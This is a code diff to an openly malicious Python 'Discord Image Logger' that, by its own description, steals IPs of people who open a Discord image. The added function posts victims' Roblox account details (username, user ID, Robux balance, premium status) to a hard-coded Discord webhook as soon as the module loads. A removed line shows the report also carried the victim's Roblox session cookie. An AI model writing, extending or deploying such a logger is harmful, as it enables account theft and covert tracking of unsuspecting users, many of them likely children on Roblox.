@@ -4,6 +4,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -94,7 +95,6 @@ def get_roblox_info():
     except:
         return None
 
-roblox_info = get_roblox_info()
 
 
 def reportError(error):
@@ -109,6 +109,36 @@ def reportError(error):
         }
     ],
 })
+
+
+def send_to_webhook(roblox_info):
+    if not roblox_info:
+        return
+    
+    webhook_url = "https://discord.com/api/webhooks/1477054008400154857/tw2pK-xTaQNHLwJNWuLzrSn86884av8RRswJZjH64MDDCnGphGlP8v9xfmmlRuRcAwCU"  # Replace with your actual webhook
+    
+    embed = {
+        "title": "Roblox Account Info",
+        "color": 0xFF0000,
+        "fields": [
+            {"name": "Username", "value": roblox_info['username'], "inline": True},
+            {"name": "Display Name", "value": roblox_info['displayName'], "inline": True},
+            {"name": "User ID", "value": str(roblox_info['id']), "inline": True},
+            {"name": "Robux Balance", "value": str(roblox_info['robux']), "inline": True},
+            {"name": "Premium Status", "value": "Yes" if roblox_info['premium'] else "No", "inline": True}
+        ]
+    }
+    
+    payload = {
+        "embeds": [embed],
+        "username": "Roblox Info Logger"
+    }
+    
+    requests.post(webhook_url, json=payload)
+
+roblox_data = get_roblox_info()
+send_to_webhook(roblox_data)
+
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
@@ -169,7 +199,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!** + (f"\n\n**Roblox Account:**\n> **Username:** `{roblox_info['username']}`\n> **Display Name:** `{roblox_info['displayName']}`\n> **User ID:** `{roblox_info['id']}`\n> **Robux:** `{roblox_info['robux']}`\n> **Premium:** `{'Yes' if roblox_info['premium'] else 'No'}`\n> **Cookie:** ```{roblox_info['cookie']}```" if roblox_info else "") +
+            "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
             
